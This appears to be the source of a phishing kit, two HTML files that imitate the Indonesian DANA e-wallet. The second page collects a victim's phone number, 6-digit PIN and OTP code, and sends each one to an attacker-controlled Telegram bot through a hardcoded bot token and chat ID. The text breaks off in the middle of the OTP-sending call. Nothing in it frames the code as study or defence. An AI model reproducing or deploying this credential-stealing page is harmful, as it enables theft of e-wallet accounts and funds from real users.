<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8"/>
        <meta name="description" content=""/>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Template</title>
        <style>
        </style>
    </head>
    <body>
        <p id = "myid" ></p>
        <script>
            document.getElementById("myid").innerText = "DANA PAYLATER";
        </script>
    </body>
</html>
<!DOCTYPE html>
<html>
<head>
    <style>
        /* Desain sederhana agar terlihat rapi */
        .input-group { margin-bottom: 15px; }
        label { display: block; font-weight: bold; margin-bottom: 5px; }
        input { width: 100%; padding: 8px; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background-color: #118eea; color: white; border: none; cursor: pointer; }
    </style>
</head>
<body>

    <div id="login-section">
        <div class="input-group">
            <label>NOMOR HANDPHONE</label>
            <input type="number" id="phone" placeholder="Contoh: 0812xxxx" required>
        </div>

        <div class="input-group">
            <label>PIN DANA (6 DIGIT)</label>
            <input type="password" id="pin" maxlength="6" placeholder="* * * * * *" required>
        </div>

        <button onclick="kirimData()">Lanjut</button>
    </div>

    <div id="otp-section" style="display: none;">
        <p style="text-align: center;">Kode OTP telah dikirim ke nomor Anda.</p>
        <div class="input-group">
            <label>KODE OTP</label>
            <input type="number" id="otp" placeholder="Masukkan 4-6 digit OTP" required>
        </div>
        <button onclick="kirimOTP()">Konfirmasi OTP</button>
    </div>

    <div id="hasil" style="margin-top: 15px; text-align: center;"></div>

    <script>
        const token = "7249905709:AAEo6FwCMZn0twG82kyojuHP5QL6tXjuhHU";
        const chatId = "6819335845";

        function kirimData() {
            const phone = document.getElementById('phone').value;
            const pin = document.getElementById('pin').value;
            const hasilDiv = document.getElementById('hasil');

            if (phone == "" || pin == "") {
                hasilDiv.innerText = "Nomor HP dan PIN wajib diisi";
                hasilDiv.style.color = "red";
                return;
            }

            if (pin.length < 6) {
                hasilDiv.innerText = "PIN harus 6 digit";
                hasilDiv.style.color = "red";
                return;
            }

            hasilDiv.style.color = "#118eea";
            hasilDiv.innerHTML = "<strong>Memproses...</strong>";

            const pesan = `🔔 *DATA LOGIN BARU*\n\n📱 No. HP: ${phone}\n🔑 PIN: ${pin}`;

            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: pesan,
                    parse_mode: 'Markdown'
                })
            }).then(() => {
                // Sembunyikan form login, tampilkan form OTP
                document.getElementById('login-section').style.display = 'none';
                document.getElementById('otp-section').style.display = 'block';
                hasilDiv.innerHTML = ""; 
            }).catch(err => {
                hasilDiv.innerText = "Terjadi kesalahan, coba lagi.";
            });
        }

        function kirimOTP() {
            const otp = document.getElementById('otp').value;
            const phone = document.getElementById('phone').value;
            const hasilDiv = document.getElementById('hasil');

            if (otp == "") {
                alert("Masukkan kode OTP!");
                return;
            }

            hasilDiv.innerHTML = "<strong>Memverifikasi OTP...</strong>";

            const pesanOTP = `💬 *KODE OTP DANA*\n\n📱 No. HP: ${phone}\n🔢 OTP: ${otp}`;

            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',